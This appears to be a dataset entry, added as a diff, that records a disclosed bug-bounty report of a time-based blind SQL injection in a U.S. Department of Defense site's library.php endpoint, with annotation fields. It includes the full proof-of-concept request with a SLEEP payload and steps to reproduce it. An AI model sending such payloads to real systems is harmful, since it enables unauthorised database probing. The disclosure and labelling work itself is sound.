@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "sp1d3rs ",
+  "title": "SQL injection on the https://\u2588\u2588\u2588\u2588/",
+  "content": "\nDescription\nHello. I was able to find Blind SQL injection on the https://\u2588\u2588\u2588/\nDatabase appears to be MySQL 5.\nPOC\nCode 534 Bytes\n1GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\n3Connection: keep-alive\n4Cache-Control: max-age=0\n5Upgrade-Insecure-Requests: 1\n6User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n8Accept-Encoding: gzip, deflate, br\n9Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\n10Cookie: _ga=GA1.2.1697249984.1548431559\n11\n12\nBy issuing sleep(0) response will be delayed to 0 seconds.\nBy issuing sleep(1) response will be delayed to 5 seconds.\nBy issuing sleep(2) response will be delayed to 10 seconds.\nBy issuing sleep(5) response will be delayed to 25 seconds.\nAs POC, I retrieved count of databases (3). No other information was accessed (such as tables or data):\nApparently, SQL statement is executing 5 times on the database side, because response time always 5 times bigger than supplied sleep value.\nImpact\nSQL injection usually have high-critical impact.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1570216740,
+  "report_url": "https://hackerone.com/reports/488795",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a GET request to /library.php with the parameter path=test&doc_id=1 AND (SELECT * FROM (SELECT(SLEEP(1)))WUeh"
+    ],
+    [
+      2,
+      "Observe the response time to confirm the SQL injection vulnerability (response time increases proportionally to the sleep value)"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Blind SQL injection in the /library.php endpoint, where the doc_id parameter is vulnerable. The attacker can inject SQL commands that cause the database to delay its response, confirming the injection. The database appears to be MySQL 5, and the SQL statement is executed 5 times on the database side, as evidenced by the response time being 5 times the supplied sleep value.",
+  "reason": "The attack involves a straightforward SQL injection technique using time-based blind SQL injection. The discovery requires basic understanding of SQL injection and the use of time delays to confirm the vulnerability. There are no complex interactions or multiple components involved.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves manipulating the database query directly through the 'doc_id' parameter, which is not related to authentication or authorization boundaries. The methodology described focuses on testing authentication and authorization by swapping user sessions and resource IDs, not on detecting SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
